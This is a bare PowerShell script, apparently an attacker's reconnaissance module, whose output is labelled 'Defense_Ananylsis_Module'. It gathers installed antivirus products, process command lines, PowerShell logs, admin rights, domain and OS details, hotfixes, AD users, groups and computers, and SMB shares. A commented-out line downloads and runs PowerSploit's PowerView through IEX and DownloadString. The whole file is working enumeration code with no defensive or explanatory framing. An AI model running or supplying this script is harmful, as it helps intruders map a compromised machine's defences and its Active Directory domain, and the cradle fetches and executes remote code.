$AV1=Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct | Out-String
$PS=CimInstance Win32_Process | select ProcessID,Name,CommandLine  | Format-Table -Wrap -AutoSize | Out-String
$PWL=Get-WinEvent -ListLog "Windows PowerShell" | where {$_.RecordCount -gt 0} | Out-String
$admin=(New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) | Out-String

$joined=if ($env:computername -eq $env:userdomain) { echo " no AD domain" } else { echo "must be in AD"}
$Joined2=(gwmi win32_computersystem).partofdomain | Out-String
$domain=(Get-WmiObject Win32_ComputerSystem).Domain | Out-String
$Joined2="$Joined2,$domain"
#IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1');
#$PCinfo=Get-ComputerInfo | Out-String
$pc=Get-CimInstance Win32_OperatingSystem | Select-Object  Caption, InstallDate, ServicePackMajorVersion, OSArchitecture,  BuildNumber, CSName,LastBootUpTime,CurrentTimeZone,LocalDateTime | FL | Out-String
$bios= Get-CimInstance -Class Win32_BIOS | Out-String
$pc="$pc$bios"
$hotfixes=get-wmiobject -class win32_quickfixengineering | Out-String
$ADUsers=Get-WmiObject -Class Win32_UserAccount -Filter  "LocalAccount='False'" | Out-String
$ADgroups=Get-WmiObject -Class Win32_Group -Filter  "LocalAccount='False'" | Select Name | Out-String
#| Select Name,  Status, SID | Out-String
#ADgroups=Get-ADGroup -Filter 'GroupCategory -eq "Security" -and GroupScope -ne "DomainLocal"' | Out-String
$loggedin=Get-WMIObject -class Win32_ComputerSystem | select username | Out-String


#$loggedin2=gcim Win32_LoggedOnUser | Select Antecedent | Out-String

#$loggedin3_d=query user /server:$SERVER | Out-String


$ADPC=Get-DomainComputer | Out-String
#$ADPC2_d=wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname | Out-String

$shares=Get-SMBShare | Out-String

#$output="`n`n###############`n$AV1 `n`n###############`n$PS `n`n###############`n$PWL `n`n###############`n$admin `n`n###############`n$joined `n`n###############`n$PCinfo `n`n###############`n$ADUsers `n`n###############`n$ADgroups `n`n###############`n$loggedin `n`n###############`n$loggedin `n`n###############`n$loggedin2 `n`n###############`n$loggedin3_d `n`n###############`n$ADPC2_d `n`n###############`n$shares"
#$output="`n`n###############`n$AV1 `n`n###############`n$PS `n`n###############`n$PWL `n`n###############`n$admin `n`n###############`n$joined `n`n###############`n$PCinfo `n`n###############`n$ADUsers `n`n###############`n$ADgroups `n`n###############`n$loggedin `n`n###############`n$loggedin `n`n###############`n$loggedin2 `n`n###############`n$loggedin3_d `n`n###############`n$ADPC2_d `n`n###############`n$shares"
$output="Defense_Ananylsis_Module`n`n###############`n$AV1 `n`n###############`n$PS `n`n###############`n$PWL `n`n###############`n$admin `n`n###############`n$joined2 `n`n###############`n$pc `n`n###############`n$hotfixes `n`n###############`n$ADUsers `n`n###############`n$ADgroups `n`n###############`n$ADPC `n`n###############`n$shares"
echo $output
